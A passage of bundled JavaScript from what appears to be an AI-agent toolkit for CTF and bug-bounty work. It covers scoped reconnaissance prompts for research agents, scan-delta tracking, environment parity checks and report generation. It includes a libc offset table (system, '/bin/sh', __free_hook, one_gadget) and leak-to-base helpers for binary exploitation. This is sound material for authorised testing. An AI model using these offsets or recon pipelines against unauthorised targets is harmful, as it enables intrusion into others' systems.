        "Prioritize authenticated boundary indicators and sensitive data flows."
      ].join(`
`), target)
    },
    {
      purpose: "content-discovery-directories",
      agent: "bounty-research",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 3: Content Discovery]`,
        `Target: ${target}`,
        "Run focused directory/content discovery with conservative wordlists and cadence.",
        "Report only high-signal findings and likely validation paths."
      ].join(`
`), target)
    }
  ];
  return {
    phase: 3,
    name: "Content Discovery",
    tracks
  };
}
function planVulnScan(target) {
  const tracks = [
    {
      purpose: "vuln-scan-nuclei-focused",
      agent: "bounty-research",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 4: Vulnerability Scan]`,
        `Target: ${target}`,
        "Run focused vulnerability checks aligned to discovered technologies/assets.",
        "Prefer high-confidence templates/checks over broad noisy scanning."
      ].join(`
`), target)
    },
    {
      purpose: "vuln-scan-focused-manual",
      agent: "bounty-research",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 4: Vulnerability Scan]`,
        `Target: ${target}`,
        "Design minimal-impact manual checks for top candidate weaknesses.",
        "Return reproducible validation steps with strict scope safety."
      ].join(`
`), target)
    }
  ];
  return {
    phase: 4,
    name: "Vulnerability Scan",
    tracks
  };
}
function planReconPipeline(state, config3, target, options) {
  const normalizedTarget = target.trim() || "<target>";
  const scopedAssets = normalizeScope(options?.scope, normalizedTarget);
  const skip = new Set(options?.skipPhases ?? []);
  const maxTracksPerPhase = typeof options?.maxTracksPerPhase === "number" && options.maxTracksPerPhase > 0 ? Math.floor(options.maxTracksPerPhase) : Number.MAX_SAFE_INTEGER;
  const phases = [
    planAssetDiscovery(normalizedTarget, scopedAssets),
    planLiveHostTriage(normalizedTarget),
    planContentDiscovery(normalizedTarget),
    planVulnScan(normalizedTarget)
  ].filter((phase) => !skip.has(phase.phase));
  const scannerPolicyNote = config3.bounty_policy.deny_scanner_commands ? "Scanner restrictions may apply; prefer scoped, low-noise checks." : "Scanner restrictions are relaxed; still stay conservative and in-scope.";
  const tracks = phases.flatMap((phase) => phase.tracks.slice(0, maxTracksPerPhase).map((track, index) => ({
    purpose: `phase-${phase.phase}-${index + 1}-${track.purpose}`,
    agent: track.agent,
    prompt: `${track.prompt}

Scope status at pipeline build: ${state.scopeConfirmed ? "confirmed" : "unconfirmed"}.
Policy note: ${scannerPolicyNote}`
  })));
  const safeLabel = normalizedTarget.replace(/[^a-z0-9]+/gi, "-").replace(/^-+|-+$/g, "").toLowerCase() || "target";
  return {
    label: `bounty-recon-${safeLabel}`,
    tracks
  };
}

// src/orchestration/delta-scan.ts
var scanHistory = new Map;
function normalizeKey(target) {
  return target.trim().toLowerCase();
}
function uniqueSorted(values) {
  return [...new Set(values.map((value) => value.trim()).filter(Boolean))].sort((a, b) => a.localeCompare(b));
}
function summarizeDelta(delta) {
  const parts = [
    `newAssets=${delta.newAssets.length}`,
    `removedAssets=${delta.removedAssets.length}`,
    `newFindings=${delta.newFindings.length}`,
    `resolvedFindings=${delta.resolvedFindings.length}`,
    `templateChanged=${delta.templateChanged ? "yes" : "no"}`
  ];
  return `Delta: ${parts.join(", ")}`;
}
function saveScanSnapshot(snapshot) {
  const key = normalizeKey(snapshot.target);
  if (!key) {
    return;
  }
  const entry = {
    ...snapshot,
    target: snapshot.target.trim(),
    assets: uniqueSorted(snapshot.assets),
    findings: uniqueSorted(snapshot.findings),
    templateSet: snapshot.templateSet.trim()
  };
  const existing = scanHistory.get(key) ?? [];
  existing.push(entry);
  existing.sort((a, b) => a.timestamp - b.timestamp);
  scanHistory.set(key, existing);
}
function getLatestSnapshot(target) {
  const history = scanHistory.get(normalizeKey(target));
  if (!history || history.length === 0) {
    return null;
  }
  return history[history.length - 1] ?? null;
}
function computeDelta(previous, current) {
  const previousAssets = new Set(uniqueSorted(previous.assets));
  const currentAssets = new Set(uniqueSorted(current.assets));
  const previousFindings = new Set(uniqueSorted(previous.findings));
  const currentFindings = new Set(uniqueSorted(current.findings));
  const newAssets = [...currentAssets].filter((asset) => !previousAssets.has(asset));
  const removedAssets = [...previousAssets].filter((asset) => !currentAssets.has(asset));
  const newFindings = [...currentFindings].filter((finding) => !previousFindings.has(finding));
  const resolvedFindings = [...previousFindings].filter((finding) => !currentFindings.has(finding));
  const templateChanged = previous.templateSet.trim() !== current.templateSet.trim();
  const deltaWithoutSummary = {
    newAssets: newAssets.sort((a, b) => a.localeCompare(b)),
    removedAssets: removedAssets.sort((a, b) => a.localeCompare(b)),
    newFindings: newFindings.sort((a, b) => a.localeCompare(b)),
    resolvedFindings: resolvedFindings.sort((a, b) => a.localeCompare(b)),
    templateChanged
  };
  return {
    ...deltaWithoutSummary,
    summary: summarizeDelta(deltaWithoutSummary)
  };
}
function getScanHistory(target) {
  const history = scanHistory.get(normalizeKey(target));
  if (!history) {
    return [];
  }
  return [...history];
}
function buildDeltaSummary(target, current) {
  const history = getScanHistory(target);
  if (history.length === 0) {
    return `No previous snapshot found for ${target}. Current snapshot ${current.id} is treated as baseline.`;
  }
  const latest = history[history.length - 1];
  const previous = latest && latest.id === current.id ? history[history.length - 2] : latest;
  if (!previous) {
    return `No prior snapshot before ${current.id} for ${target}. Current snapshot is baseline.`;
  }
  const delta = computeDelta(previous, current);
  const detailParts = [];
  if (delta.newAssets.length > 0) {
    detailParts.push(`New assets: ${delta.newAssets.join(", ")}`);
  }
  if (delta.removedAssets.length > 0) {
    detailParts.push(`Removed assets: ${delta.removedAssets.join(", ")}`);
  }
  if (delta.newFindings.length > 0) {
    detailParts.push(`New findings: ${delta.newFindings.join(", ")}`);
  }
  if (delta.resolvedFindings.length > 0) {
    detailParts.push(`Resolved findings: ${delta.resolvedFindings.join(", ")}`);
  }
  if (delta.templateChanged) {
    detailParts.push(`Template set changed: ${previous.templateSet} -> ${current.templateSet}`);
  }
  const details = detailParts.length > 0 ? `
${detailParts.join(`
`)}` : `
No material changes detected.`;
  return `Target ${target} delta from ${previous.id} to ${current.id}: ${delta.summary}${details}`;
}
function shouldRescan(target, templateSet, maxAgeMs = 24 * 60 * 60 * 1000) {
  const latest = getLatestSnapshot(target);
  if (!latest) {
    return true;
  }
  if (latest.templateSet.trim() !== templateSet.trim()) {
    return true;
  }
  if (maxAgeMs <= 0) {
    return true;
  }
  const ageMs = Date.now() - latest.timestamp;
  return ageMs >= maxAgeMs;
}

// src/orchestration/libc-database.ts
var COMMON_LIBCS = [
  {
    id: "libc6_2.31-0ubuntu9.9_amd64",
    symbols: {
      puts: 554400,
      printf: 413312,
      read: 1118512,
      write: 1118672,
      system: 349200,
      execve: 941824,
      str_bin_sh: 1799594,
      __libc_start_main: 159680,
      __free_hook: 2026280,
      __malloc_hook: 2014064,
      setcontext: 363776,
      one_gadget_0: 945278,
      one_gadget_1: 945281,
      one_gadget_2: 945284
    }
  },
  {
    id: "libc6_2.27-3ubuntu1_amd64",
    symbols: {
      puts: 526784,
      printf: 413200,
      read: 1114224,
      write: 1114432,
      system: 324672,
      execve: 937520,
      str_bin_sh: 1785498,
      __libc_start_main: 137904,
      __free_hook: 4118760,
      __malloc_hook: 4111408,
      setcontext: 336144,
      one_gadget_0: 324261,
      one_gadget_1: 324354,
      one_gadget_2: 1090300
    }
  },
  {
    id: "libc6_2.23-0ubuntu11.3_amd64",
    symbols: {
      puts: 456336,
      printf: 350208,
      read: 1012304,
      write: 1012400,
      system: 283536,
      execve: 837488,
      str_bin_sh: 1625431,
      __libc_start_main: 132928,
      __free_hook: 3958696,
      __malloc_hook: 3951376,
      setcontext: 293749,
      one_gadget_0: 283158,
      one_gadget_1: 283242,
      one_gadget_2: 983716,
      one_gadget_3: 987463
    }
  }
];
function parseAddress(value) {
  const trimmed = value.trim().toLowerCase();
  if (!trimmed) {
    return null;
  }
  const normalized = trimmed.startsWith("0x") ? trimmed : `0x${trimmed}`;
  if (!/^0x[0-9a-f]+$/.test(normalized)) {
    return null;
  }
  try {
    return BigInt(normalized);
  } catch {
    return null;
  }
}
function normalizeSymbolName(name) {
  return name.trim();
}
function safeQueryRequests(requests) {
  if (!Array.isArray(requests)) {
    return [];
  }
  const output = [];
  for (const request of requests) {
    const symbolName = normalizeSymbolName(request.symbolName ?? "");
    const parsed = parseAddress(request.address ?? "");
    if (!symbolName || parsed === null) {
      continue;
    }
    output.push({
      symbolName,
      address: `0x${parsed.toString(16)}`
    });
  }
  return output;
}
function symbolOffsetNibble(offset) {
  return (offset & 4095).toString(16).padStart(3, "0");
}
function extractOffset(address) {
  const parsed = parseAddress(address ?? "");
  if (parsed === null) {
    return "";
  }
  const nibbles = Number(parsed & BigInt(4095));
  return nibbles.toString(16).padStart(3, "0");
}
function localLookup(requests) {
  const query = safeQueryRequests(requests);
  if (query.length === 0) {
    return {
      matches: [],
      lookupSource: "local",
      query: []
    };
  }
  const matches = COMMON_LIBCS.filter((libc) => {
    return query.every((request) => {
      const symbolOffset = libc.symbols[request.symbolName];
      if (typeof symbolOffset !== "number") {
        return false;
      }
      return symbolOffsetNibble(symbolOffset) === extractOffset(request.address);
    });
  });
  return {
    matches,
    lookupSource: "local",
    query
  };
}
function buildLibcRipUrl(requests) {
  const query = safeQueryRequests(requests);
  if (query.length === 0) {
    return "https://libc.rip/";
  }
  const params = query.map((request) => `${encodeURIComponent(request.symbolName)}=${encodeURIComponent(extractOffset(request.address))}`).join("&");
  return `https://libc.rip/api/find?${params}`;
}
function getUsefulOffsets(libc) {
  const symbols = libc?.symbols ?? {};
  const oneGadgetKeys = Object.keys(symbols).filter((key) => key.startsWith("one_gadget_")).sort();
  const offsets = {
    puts: symbols.puts ?? null,
    printf: symbols.printf ?? null,
    read: symbols.read ?? null,
    write: symbols.write ?? null,
    system: symbols.system ?? null,
    execve: symbols.execve ?? null,
    str_bin_sh: symbols.str_bin_sh ?? null,
    __libc_start_main: symbols.__libc_start_main ?? null,
    __free_hook: symbols.__free_hook ?? null,
    __malloc_hook: symbols.__malloc_hook ?? null,
    setcontext: symbols.setcontext ?? null
  };
  for (const key of oneGadgetKeys) {
    offsets[key] = symbols[key] ?? null;
  }
  return offsets;
}
function buildLibcSummary(result) {
  const queryText = result.query.map((q) => `${q.symbolName}@${extractOffset(q.address)}`).join(", ") || "none";
  if (result.matches.length === 0) {
    return [
      `Libc lookup source: ${result.lookupSource}`,
      `Query: ${queryText}`,
      "No local libc candidates matched all provided leaked offsets."
    ].join(`
`);
  }
  const lines = [
    `Libc lookup source: ${result.lookupSource}`,
    `Query: ${queryText}`,
    `Candidates: ${result.matches.length}`
  ];
  for (const libc of result.matches) {
    const useful = getUsefulOffsets(libc);
    lines.push(`- ${libc.id}${libc.buildId ? ` (buildId=${libc.buildId})` : ""}`, `  system=${useful.system ?? "n/a"} | /bin/sh=${useful.str_bin_sh ?? "n/a"} | __free_hook=${useful.__free_hook ?? "n/a"}`);
  }
  return lines.join(`
`);
}
function computeLibcBase(leakedAddress, symbolOffset) {
  const parsedLeak = parseAddress(leakedAddress ?? "");
  if (parsedLeak === null || !Number.isFinite(symbolOffset) || symbolOffset < 0) {
    return "";
  }
  const offset = BigInt(Math.trunc(symbolOffset));
  if (parsedLeak < offset) {
    return "";
  }
  const base = parsedLeak - offset;
  return `0x${base.toString(16)}`;
}

// src/orchestration/env-parity.ts
var UNKNOWN_VALUE = "unknown";
function shellQuote3(value) {
  return `'${value.replace(/'/g, `'"'"'`)}'`;
}
function normalizeArch(value) {
  const normalized = (value ?? "").trim().toLowerCase();
  if (!normalized) {
    return;
  }
  if (["amd64", "x86_64", "x64"].includes(normalized)) {
    return "x86_64";
  }
  if (["i386", "386", "x86"].includes(normalized)) {
    return "i386";
  }
  if (["arm64", "aarch64"].includes(normalized)) {
    return "aarch64";
  }
  return normalized;
}
function normalizeVersion(value) {
  const input = (value ?? "").trim();
  if (!input) {
    return;
  }
  const match = input.match(/\d+\.\d+(?:\.\d+)?/);
  return match?.[0];
}
function toDisplay(value) {
  const normalized = value?.trim();
  return normalized ? normalized : UNKNOWN_VALUE;
}
function trimOrUndefined(value) {
  const normalized = value?.trim();
  return normalized ? normalized : undefined;
}
function sanitizePath(rawPath) {
  return rawPath.replace(/[)"']+$/g, "").trim();
}
function dockerPlatformFromArch(arch) {
  const normalized = normalizeArch(arch);
  if (!normalized) {
    return;
  }
  if (normalized === "x86_64") {
    return "linux/amd64";
  }
  if (normalized === "i386") {
    return "linux/386";
  }
  if (normalized === "aarch64") {
    return "linux/arm64";
  }
  return;
}
function parseDockerfile(content) {
  const text = content.replace(/\r/g, "");
  const result = {};
  const fromMatch = text.match(/^FROM\s+(?:--platform=([^\s]+)\s+)?([^\s]+)(?:\s+AS\s+[^\s]+)?/im);
  if (fromMatch) {
    const platform = trimOrUndefined(fromMatch[1]);
    const image = trimOrUndefined(fromMatch[2]);
    if (image) {
      result.dockerImage = image;
      if (/python:(\d+\.\d+(?:\.\d+)?)/i.test(image)) {
        const version3 = image.match(/python:(\d+\.\d+(?:\.\d+)?)/i)?.[1];
        result.pythonVersion = normalizeVersion(version3);
      }
      if (/arm64|aarch64/i.test(image)) {
        result.arch = "aarch64";
      } else if (/amd64|x86_64/i.test(image)) {
        result.arch = "x86_64";
      }
    }
    if (platform) {
      const archFromPlatform = platform.split("/").at(-1);
      const normalized = normalizeArch(archFromPlatform);
      if (normalized) {
        result.arch = normalized;
      }
    }
  }
  const glibcMatches = [
    text.match(/(?:GLIBC_VERSION|GLIBC)\s*[= ]\s*["']?([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1],
    text.match(/libc6(?:[:=][^\s]+)?[= ]([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1],
    text.match(/libc-([0-9]+\.[0-9]+(?:\.[0-9]+)?)\.so/i)?.[1]
  ].map((value) => normalizeVersion(value)).filter((value) => Boolean(value));
  if (glibcMatches.length > 0) {
    result.libcVersion = glibcMatches[0];
  }
  const libcPathMatch = text.match(/(\/[^\s"']*libc(?:-[0-9.]+)?\.so(?:\.6)?)/i)?.[1];
  if (libcPathMatch) {
    result.libcPath = sanitizePath(libcPathMatch);
  }
  const ldPathMatch = text.match(/(\/[^\s"']*ld-linux[^\s"']*)/i)?.[1] ?? text.match(/(\/[^\s"']*ld-[^\s"']*\.so[^\s"']*)/i)?.[1];
  if (ldPathMatch) {
    result.ldPath = sanitizePath(ldPathMatch);
  }
  const pythonVersionMatch = text.match(/python(?:3)?(?:[:= ]|\s)([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1] ?? text.match(/python3\.[0-9]+/i)?.[0]?.replace(/^python/i, "");
  if (pythonVersionMatch) {
    result.pythonVersion = normalizeVersion(pythonVersionMatch);
  }
  const seccompMatch = text.match(/SECCOMP_PROFILE\s*=\s*["']?([^\s"']+)/i)?.[1] ?? text.match(/--security-opt\s+seccomp=([^\s]+)/i)?.[1];
  if (seccompMatch) {
    result.seccompProfile = seccompMatch.trim();
  }
  result.arch = normalizeArch(result.arch);
  result.libcVersion = normalizeVersion(result.libcVersion);
  return result;
}
function localEnvCommands() {
  return [
    "uname -m",
    "ldd --version 2>&1 | head -n 1",
    "python3 --version 2>&1 || python --version 2>&1",
    "readlink -f /lib64/ld-linux-x86-64.so.2 2>/dev/null || readlink -f /lib/ld-linux.so.2 2>/dev/null || true",
    "grep -E '^(NAME|VERSION)=' /etc/os-release 2>/dev/null || true"
  ];
}
function parseLddOutput(output) {
  const text = output.replace(/\r/g, "");
  if (!text.trim()) {
    return null;
  }
  const pathMatch = text.match(/libc\.so\.6\s*=>\s*(\/[^\s]+)\s*\(/i)?.[1] ?? text.match(/(\/[^\s]*libc(?:-[0-9.]+)?\.so(?:\.6)?)/i)?.[1];
  const libcPath = trimOrUndefined(pathMatch ? sanitizePath(pathMatch) : undefined);
  if (!libcPath) {
    return null;
  }
  const version3 = normalizeVersion(text.match(/(?:GLIBC|GNU libc|ldd)[^0-9]*([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1]) ?? normalizeVersion(libcPath.match(/libc-([0-9]+\.[0-9]+(?:\.[0-9]+)?)\.so/i)?.[1]) ?? "unknown";
  return { libcPath, version: version3 };
}
function generatePatchelfCommands(binaryPath, env) {
  const commands = [];
  const targetBinary = binaryPath.trim();
  if (!targetBinary) {
    return commands;
  }
  const ldPath = trimOrUndefined(env.ldPath);
  const libcPath = trimOrUndefined(env.libcPath);
  if (ldPath) {
    commands.push(`patchelf --set-interpreter ${shellQuote3(ldPath)} ${shellQuote3(targetBinary)}`);
  }
  if (libcPath) {
    commands.push(`patchelf --replace-needed libc.so.6 ${shellQuote3(libcPath)} ${shellQuote3(targetBinary)}`);
    const slashIndex = libcPath.lastIndexOf("/");
    if (slashIndex > 0) {
      const libcDir = libcPath.slice(0, slashIndex);
      commands.push(`patchelf --set-rpath ${shellQuote3(libcDir)} ${shellQuote3(targetBinary)}`);
    }
  }
  return commands;
}
function buildParityReport(local, remote) {
  const checks5 = [];
  const normalizedLocalArch = normalizeArch(local.arch);
  const normalizedRemoteArch = normalizeArch(remote.arch);
  const normalizedLocalLibc = normalizeVersion(local.libcVersion) ?? trimOrUndefined(local.libcPath);
  const normalizedRemoteLibc = normalizeVersion(remote.libcVersion) ?? trimOrUndefined(remote.libcPath);
  const addCheck = (args) => {
    const localDisplay = toDisplay(args.localValue);
    const remoteDisplay = toDisplay(args.remoteValue);
    const match = localDisplay === UNKNOWN_VALUE && remoteDisplay === UNKNOWN_VALUE ? true : localDisplay !== UNKNOWN_VALUE && remoteDisplay !== UNKNOWN_VALUE && localDisplay === remoteDisplay;
    checks5.push({
      aspect: args.aspect,
      local: localDisplay,
      remote: remoteDisplay,
      match,
      fixCommand: match ? undefined : args.fixCommand
    });
  };
  addCheck({
    aspect: "arch",
    localValue: normalizedLocalArch,
    remoteValue: normalizedRemoteArch,
    fixCommand: normalizedRemoteArch !== undefined ? `Use docker platform ${dockerPlatformFromArch(normalizedRemoteArch) ?? normalizedRemoteArch} for execution parity.` : undefined
  });
  addCheck({
    aspect: "libc",
    localValue: normalizedLocalLibc,
    remoteValue: normalizedRemoteLibc,
    fixCommand: remote.libcPath || remote.ldPath ? generatePatchelfCommands("<binary>", {
      arch: normalizedRemoteArch ?? "unknown",
      libcPath: trimOrUndefined(remote.libcPath),
      ldPath: trimOrUndefined(remote.ldPath),
      libcVersion: normalizeVersion(remote.libcVersion)
    }).join(" && ") : undefined
  });
  addCheck({
    aspect: "ld",
    localValue: trimOrUndefined(local.ldPath),
    remoteValue: trimOrUndefined(remote.ldPath),
    fixCommand: remote.ldPath?.trim() ? `patchelf --set-interpreter ${shellQuote3(remote.ldPath.trim())} <binary>` : undefined
  });
  addCheck({
    aspect: "python",
    localValue: normalizeVersion(local.pythonVersion) ?? trimOrUndefined(local.pythonVersion),
    remoteValue: normalizeVersion(remote.pythonVersion) ?? trimOrUndefined(remote.pythonVersion),
    fixCommand: remote.pythonVersion?.trim() ? `pyenv install ${remote.pythonVersion.trim()} && pyenv local ${remote.pythonVersion.trim()}` : undefined
  });
  addCheck({
    aspect: "seccomp",
    localValue: trimOrUndefined(local.seccompProfile),
    remoteValue: trimOrUndefined(remote.seccompProfile),
    fixCommand: remote.seccompProfile?.trim() ? `docker run --security-opt seccomp=${shellQuote3(remote.seccompProfile.trim())} ...` : undefined
  });
  const fixCommands = Array.from(new Set(checks5.filter((check3) => !check3.match && check3.fixCommand).map((check3) => check3.fixCommand).map((command) => command.trim()).filter(Boolean)));
  const allMatch = checks5.every((check3) => check3.match);
  const summaryLines = [`Parity checks: ${checks5.filter((check3) => check3.match).length}/${checks5.length} matched.`];
  if (allMatch) {
    summaryLines.push("Local and remote environment appear aligned for tracked aspects.");
  } else {
    const mismatches = checks5.filter((check3) => !check3.match).map((check3) => check3.aspect);
    summaryLines.push(`Mismatched aspects: ${mismatches.join(", ")}.`);
    if (fixCommands.length > 0) {
      summaryLines.push(`Suggested fixes: ${fixCommands.length} command(s) generated.`);
    }
  }
  return {
    checks: checks5,
    allMatch,
    fixCommands,
    summary: summaryLines.join(" ")
  };
}
function buildParitySummary(report) {
  const lines = [report.summary];
  for (const check3 of report.checks) {
    const status = check3.match ? "OK" : "MISMATCH";
    lines.push(`- [${status}] ${check3.aspect}: local=${check3.local} remote=${check3.remote}`);
  }
  if (!report.allMatch && report.fixCommands.length > 0) {
    lines.push("Fix commands:");
    for (const command of report.fixCommands) {
      lines.push(`- ${command}`);
    }
  }
  return lines.join(`
`);
}

// src/orchestration/report-generator.ts
function trimLine(line) {
  return line.trim();
}
function stripListPrefix(line) {
  return line.replace(/^[-*]\s+/, "").replace(/^\d+\.\s+/, "").trim();
}
function stripHeadingPrefix(line) {
  return line.replace(/^#{1,6}\s+/, "").trim();
}
function cleanupArtifactToken(value) {
  return value.trim().replace(/^[<("']+/, "").replace(/[>)"',.;:]+$/, "");
}
function extractTimestamp(line) {
  const bracketed = line.match(/^\[([^\]]+)\]\s*(.*)$/);
  if (bracketed) {
    return {
      timestamp: bracketed[1].trim(),
      rest: bracketed[2].trim()
    };
  }
  const isoLike = line.match(/^(\d{4}[-/]\d{2}[-/]\d{2}(?:[ T]\d{2}:\d{2}(?::\d{2})?(?:\s*(?:UTC|KST|[A-Z]{2,5}|[+-]\d{2}:?\d{2}))?)?)\s*(?:[-:|])?\s*(.*)$/);
  if (isoLike) {
    return {
      timestamp: isoLike[1].trim(),
      rest: isoLike[2].trim()
    };
  }
  const timeOnly = line.match(/^(\d{2}:\d{2}(?::\d{2})?)\s*(?:[-:|])?\s*(.*)$/);
  if (timeOnly) {
    return {
      timestamp: timeOnly[1].trim(),
      rest: timeOnly[2].trim()
    };
  }
  return { rest: line };
}
function splitActionResult(line) {
  const delimiters = ["=>", "->", "|"];
  for (const delimiter of delimiters) {
    const index = line.indexOf(delimiter);
    if (index > 0) {
      const action = line.slice(0, index).trim();
      const result = line.slice(index + delimiter.length).trim();
      return {
        action: action || "log",
        result: result || "not specified"
      };
    }
  }
  const keyValue = line.match(/^(?:action|tried|step)\s*:\s*(.+?)(?:\s+(?:result|observed|outcome|status)\s*:\s*(.+))?$/i);
  if (keyValue) {
    return {
      action: keyValue[1].trim(),
      result: keyValue[2]?.trim() || "not specified"
    };
  }
  const resultOnly = line.match(/^(?:result|observed|outcome|status)\s*:\s*(.+)$/i);
  if (resultOnly) {
    return {
      action: "observation",
      result: resultOnly[1].trim()
    };
  }
  const embeddedResult = line.match(/^(.+?)\s+(?:result|observed|outcome|status)\s*:\s*(.+)$/i);
  if (embeddedResult) {
    return {
      action: embeddedResult[1].trim(),
      result: embeddedResult[2].trim()
    };
  }
  return {
    action: line.trim() || "log",
    result: "not specified"
  };
}
function extractArtifactPaths(content) {
  const artifacts = new Set;
  const inlineCodePattern = /`([^`]+)`/g;
  for (const match of content.matchAll(inlineCodePattern)) {
    const candidate = cleanupArtifactToken(match[1]);
    if (/[/\\]/.test(candidate) || /\.[a-zA-Z0-9]{1,8}$/.test(candidate)) {
      artifacts.add(candidate);
    }
  }
  const markdownLinkPattern = /\[[^\]]+\]\(([^)]+)\)/g;
  for (const match of content.matchAll(markdownLinkPattern)) {
    const candidate = cleanupArtifactToken(match[1]);
    if (candidate) {
      artifacts.add(candidate);
    }
  }
  const pathPattern = /(?:^|\s)(\.?\/?[A-Za-z0-9_.-]+(?:\/[A-Za-z0-9_.-]+)+)/g;
  for (const match of content.matchAll(pathPattern)) {
    const candidate = cleanupArtifactToken(match[1]);
    if (candidate && !/^https?:\/\//i.test(candidate)) {
      artifacts.add(candidate);
    }
  }
  return Array.from(artifacts);
}
function isEntryBoundary(line) {
  return /^#{2,6}\s+/.test(line) || /^[-*]\s+/.test(line) || /^\d+\.\s+/.test(line);
}
function finalizeEvidenceBlock(blockLines) {
  const cleaned = blockLines.map((line) => trimLine(line)).filter(Boolean);
  if (cleaned.length === 0) {
    return null;
  }
  const firstLine = stripHeadingPrefix(stripListPrefix(cleaned[0]));
  const item = firstLine || "Evidence item";
  const verificationLine = cleaned.map((line) => stripHeadingPrefix(stripListPrefix(line))).find((line) => /\b(verified|verification|status|result|accepted|correct|impact|severity)\b/i.test(line)) ?? cleaned[1] ?? "Verification details not specified.";
  return {
    item,
    verification: stripHeadingPrefix(stripListPrefix(verificationLine)),
    artifacts: extractArtifactPaths(cleaned.join(`
`))
  };
}
function buildReport(mode, title, sections) {
  const generatedAt = Date.now();
  const draft = {
    mode,
    title,
    sections,
    generatedAt,
    markdown: ""
  };
  return {
    ...draft,
    markdown: formatReportMarkdown(draft)
  };
}
function renderWorklogEntries(entries, emptyFallback) {
  if (entries.length === 0) {
    return emptyFallback;
  }
  return entries.map((entry, index) => `${index + 1}. [${entry.timestamp}] ${entry.action} -> ${entry.result}`).join(`
`);
}
function renderEvidenceEntries(entries, emptyFallback) {
  if (entries.length === 0) {
    return emptyFallback;
  }
  return entries.map((entry) => {
    const artifactSuffix = entry.artifacts.length > 0 ? ` | artifacts: ${entry.artifacts.join(", ")}` : "";
    return `- ${entry.item}: ${entry.verification}${artifactSuffix}`;
  }).join(`
`);
}
function inferFlag(optionsFlag, evidenceContent) {
  const explicit = optionsFlag?.trim();
  if (explicit) {
    return explicit;
  }
  const detected = evidenceContent.match(/(?:flag\{|CTF\{|FLAG\{)[^\s}]+\}/);
  return detected?.[0] ?? "Not provided";
}
function parseWorklog(content) {
  const lines = content.replace(/\r/g, "").split(`
`);
  const entries = [];
  let currentTimestamp = "unknown";
  for (const rawLine of lines) {
    const cleaned = stripHeadingPrefix(stripListPrefix(trimLine(rawLine)));
    if (!cleaned) {
      continue;
    }
    const timestampParsed = extractTimestamp(cleaned);
    if (timestampParsed.timestamp) {
      currentTimestamp = timestampParsed.timestamp;
    }
    const body = (timestampParsed.rest || cleaned).trim();
    if (!body) {
      continue;
    }
    if (/^(goal|next\s*todo|todo|phase|lh|candidate|verified)\s*:/i.test(body)) {
      continue;
    }
    const split = splitActionResult(body);
    entries.push({
      timestamp: currentTimestamp,
      action: split.action,
      result: split.result
    });
  }
  return entries;
}
function parseEvidence(content) {
  const lines = content.replace(/\r/g, "").split(`
`);
  const blocks = [];
  let currentBlock = [];
  for (const rawLine of lines) {
    const trimmed = trimLine(rawLine);
    if (!trimmed) {
      if (currentBlock.length > 0) {
        blocks.push(currentBlock);
        currentBlock = [];
      }
      continue;
    }
    if (isEntryBoundary(trimmed) && currentBlock.length > 0) {
      blocks.push(currentBlock);
      currentBlock = [trimmed];
    } else {
      currentBlock.push(trimmed);
    }
  }
  if (currentBlock.length > 0) {
    blocks.push(currentBlock);
  }
  if (blocks.length === 0 && content.trim()) {
    blocks.push(content.replace(/\r/g, "").split(`
`).map((line) => trimLine(line)).filter(Boolean));
  }
  const entries = [];
  for (const block of blocks) {
    const parsed = finalizeEvidenceBlock(block);
    if (parsed) {
      entries.push(parsed);
    }
  }
  return entries;
}
function generateCtfWriteup(worklogContent, evidenceContent, options) {
  const worklogEntries = parseWorklog(worklogContent);
  const evidenceEntries = parseEvidence(evidenceContent);
  const challengeName = options?.challengeName?.trim() || "CTF Challenge";
  const category = options?.category?.trim() || "Unknown";
  const finalFlag = inferFlag(options?.flag, evidenceContent);
  const sectionArtifacts = Array.from(new Set(evidenceEntries.flatMap((entry) => entry.artifacts)));
  const sections = [
    {
      title: "Challenge Overview",
      content: [
        `- Challenge: ${challengeName}`,
        `- Category: ${category}`,
        "- Mode: CTF",
        `- Worklog Entries: ${worklogEntries.length}`,
        `- Evidence Items: ${evidenceEntries.length}`
      ].join(`
`)
    },
    {
      title: "Methodology",
      content: renderWorklogEntries(worklogEntries, "No structured worklog entries were found.")
    },
    {
      title: "Verification Evidence",
      content: renderEvidenceEntries(evidenceEntries, "No verification evidence entries were found."),
      artifacts: sectionArtifacts
    },
    {
      title: "Final Flag",
      content: `- ${finalFlag}`
    }
  ];
  return buildReport("CTF", `${challengeName} Writeup`, sections);
}
function generateBountyReport(worklogContent, evidenceContent, options) {
  const worklogEntries = parseWorklog(worklogContent);
  const evidenceEntries = parseEvidence(evidenceContent);
  const programName = options?.programName?.trim() || "Target Program";
  const severity = options?.severity?.trim() || "Unspecified";
  const endpoint = options?.endpoint?.trim() || "Not specified";
  const artifacts = Array.from(new Set(evidenceEntries.flatMap((entry) => entry.artifacts)));
  const sections = [
    {
      title: "Executive Summary",
      content: [
        `- Program: ${programName}`,
        `- Reported Severity: ${severity}`,
        `- Affected Endpoint: ${endpoint}`,
        "- Mode: BOUNTY"
      ].join(`
`)
    },
    {
      title: "Steps to Reproduce",
      content: renderWorklogEntries(worklogEntries, "No reproducible steps were parsed from WORKLOG.")
    },
    {
      title: "Observed Evidence",
      content: renderEvidenceEntries(evidenceEntries, "No structured evidence entries were parsed from EVIDENCE."),
      artifacts
    },
    {
      title: "Impact",
      content: [
        `- Claimed Severity: ${severity}`,
        "- Validate business impact with explicit authorization and reproducible minimal-impact proof."
      ].join(`
`)
    },
    {
      title: "Remediation",
      content: [
        "1. Reproduce the issue in a controlled environment using the listed steps.",
        "2. Apply the least-privilege and input-validation control relevant to the root cause.",
        "3. Re-run the validation evidence checks and confirm the issue no longer reproduces."
      ].join(`
`)
    }
  ];
  return buildReport("BOUNTY", `${programName} Security Report`, sections);
}
function generateReport(mode, worklogContent, evidenceContent, options) {
  if (mode === "CTF") {
    return generateCtfWriteup(worklogContent, evidenceContent, {
      challengeName: options?.challengeName,
      category: options?.category,
      flag: options?.flag
    });
  }
  return generateBountyReport(worklogContent, evidenceContent, {
    programName: options?.programName,
    severity: options?.severity,
    endpoint: options?.endpoint
  });
}
function formatReportMarkdown(report) {
  const lines = [
    `# ${report.title}`,
    "",
    `- Mode: ${report.mode}`,
    `- Generated At: ${new Date(report.generatedAt).toISOString()}`,
    ""
  ];
  for (const section of report.sections) {
    lines.push(`## ${section.title}`);
